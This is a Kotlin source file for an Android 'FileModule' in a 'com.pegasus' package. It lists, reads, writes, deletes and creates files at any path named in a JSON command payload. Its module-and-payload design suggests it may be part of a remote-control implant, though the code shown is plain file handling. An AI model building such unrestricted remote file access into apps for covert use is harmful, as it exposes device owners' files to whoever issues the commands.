package com.pegasus.modules

import android.content.Context
import com.pegasus.core.PegasusModule
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.Base64

class FileModule(private val context: Context) : PegasusModule {
    override val name = "file"

    override fun execute(payload: JSONObject): JSONObject {
        val action = payload.optString("action")
        val path = payload.optString("path", "/")

        return when (action) {
            "list" -> listDirectory(path)
            "read" -> readFile(path)
            "write" -> writeFile(path, payload.getString("content"))
            "delete" -> deleteFile(path)
            "mkdir" -> createDirectory(path)
            else -> JSONObject().put("error", "Unknown file action")
        }
    }

    private fun listDirectory(path: String): JSONObject {
        val file = File(path)
        if (!file.exists() || !file.isDirectory) {
            return JSONObject().put("error", "Invalid directory")
        }
        val files = org.json.JSONArray()
        file.listFiles()?.forEach { f ->
            files.put(JSONObject().apply {
                put("name", f.name)
                put("is_dir", f.isDirectory)
                put("size", f.length())
                put("modified", f.lastModified())
            })
        }
        return JSONObject().put("files", files)
    }

    private fun readFile(path: String): JSONObject {
        val file = File(path)
        if (!file.exists()) return JSONObject().put("error", "File not found")
        return try {
            val content = file.readText()
            JSONObject().put("content", content).put("size", file.length())
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }

    private fun writeFile(path: String, content: String): JSONObject {
        val file = File(path)
        return try {
            file.parentFile?.mkdirs()
            file.writeText(content)
            JSONObject().put("success", true).put("path", file.absolutePath)
        } catch (e: Exception) {
            JSONObject().put("error", e.message)
        }
    }

    private fun deleteFile(path: String): JSONObject {
        val file = File(path)
        return if (file.exists() && file.delete()) {
            JSONObject().put("success", true)
        } else {
            JSONObject().put("error", "Failed to delete")
        }
    }

    private fun createDirectory(path: String): JSONObject {
        val dir = File(path)
        return if (dir.exists() || dir.mkdirs()) {
            JSONObject().put("success", true)
        } else {
            JSONObject().put("error", "Failed to create directory")
        }
    }
}